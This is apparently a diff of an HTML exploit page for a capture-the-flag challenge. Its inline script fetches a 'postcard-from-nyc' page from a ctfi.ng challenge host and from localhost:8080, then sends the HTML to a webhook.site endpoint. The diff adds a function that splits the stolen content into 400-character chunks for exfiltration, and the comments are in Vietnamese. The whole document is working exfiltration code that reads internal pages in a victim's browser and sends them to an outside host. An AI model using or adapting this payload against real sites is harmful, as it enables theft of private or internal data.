@@ -9,30 +9,34 @@ const target = "https://mirror-temple-b-side-5e7012f5633b.ctfi.ng/postcard-from-
 const target2 = "https://localhost:8080/postcard-from-nyc";
 const webhook = "https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site";
 
+function sendHTML(html) {
+
+  // gửi len như bạn đang làm
+  fetch(webhook + "/len?l=" + html.length);
+
+  // gửi html theo chunk để tránh URL quá dài
+  const chunk = 400;
+
+  for (let i = 0; i < html.length; i += chunk) {
+    const part = html.slice(i, i + chunk);
+    fetch(webhook + "/html?i=" + i + "&d=" + encodeURIComponent(part));
+  }
+}
+
 fetch(target)
   .then(r => r.text())
-  .then(html => {
-    // gửi chiều dài để debug
-    fetch(webhook + "/len?l=" + html.length);
-
-    // gửi nội dung (encode để không vỡ query)
-    fetch(webhook + "/html?data=" + encodeURIComponent(html));
-  })
+  .then(html => sendHTML(html))
   .catch(e => {
     fetch(webhook + "/err?e=" + encodeURIComponent(e.toString()));
   });
+
 fetch(target2)
   .then(r => r.text())
-  .then(html => {
-    // gửi chiều dài để debug
-    fetch(webhook + "/len?l=" + html.length);
-
-    // gửi nội dung (encode để không vỡ query)
-    fetch(webhook + "/html?data=" + encodeURIComponent(html));
-  })
+  .then(html => sendHTML(html))
   .catch(e => {
     fetch(webhook + "/err?e=" + encodeURIComponent(e.toString()));
   });
+
 </script>
 </body>
 </html>
